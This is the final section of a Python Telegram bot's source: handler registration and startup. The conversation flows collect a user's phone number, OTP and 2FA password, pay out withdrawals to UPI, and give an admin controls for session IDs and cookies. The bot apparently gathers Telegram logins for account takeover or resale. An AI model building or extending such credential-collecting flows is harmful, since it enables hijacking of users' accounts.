    add_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^➕ Add TG Account$"), msg_add_account)],
        states={
            ADD_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, got_phone)],
            ADD_OTP:   [MessageHandler(filters.TEXT & ~filters.COMMAND, got_otp)],
            ADD_2FA:   [MessageHandler(filters.TEXT & ~filters.COMMAND, got_2fa)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        per_user=True, per_chat=True,
    )

    w_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^💸 Withdrawal$"), msg_withdrawal)],
        states={
            W_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, got_w_amount)],
            W_UPI:    [MessageHandler(filters.TEXT & ~filters.COMMAND, got_w_upi)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        per_user=True, per_chat=True,
    )

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(add_conv)
    app.add_handler(w_conv)
    app.add_handler(MessageHandler(filters.Regex("^📋 TG Task$"), msg_tg_task))
    app.add_handler(CallbackQueryHandler(cb_check_join, pattern="^check_join$"))
    app.add_handler(CallbackQueryHandler(cb_back_main,  pattern="^back_main$"))
    app.add_handler(CallbackQueryHandler(cb_task_done,  pattern="^task_done_"))
    app.add_handler(CallbackQueryHandler(cb_pick_acc,   pattern="^pick_acc_"))
    app.add_handler(CallbackQueryHandler(cb_acc_accept, pattern="^acc_accept_"))
    app.add_handler(CallbackQueryHandler(cb_acc_reject, pattern="^acc_reject_"))
    app.add_handler(CallbackQueryHandler(cb_acc_cookie, pattern="^acc_ck_"))
    app.add_handler(CommandHandler("accounts", cmd_accounts))
    app.add_handler(CallbackQueryHandler(cb_adm_edit,     pattern="^adm_ed_"))
    app.add_handler(CallbackQueryHandler(cb_adm_sid,      pattern="^adm_sid_"))
    app.add_handler(CallbackQueryHandler(cb_adm_ckpick,   pattern="^adm_ckp_"))
    app.add_handler(CallbackQueryHandler(cb_adm_ckset,    pattern="^adm_cks_"))
    app.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND & filters.User(ADMIN_ID), admin_text))

    logger.info(f"[API] id={API_ID} hash={API_HASH[:4]}...{API_HASH[-4:]} len={len(API_HASH)}")
    logger.info("🤖 Bot starting...")
    await app.initialize()
    await app.start()
    await app.updater.start_polling(drop_pending_updates=True)
    await asyncio.Event().wait()

if __name__ == "__main__":
    start_http()
    loop = get_loop()
    try:
        loop.run_until_complete(run_bot())
    except KeyboardInterrupt:
        logger.info("Stopped.")
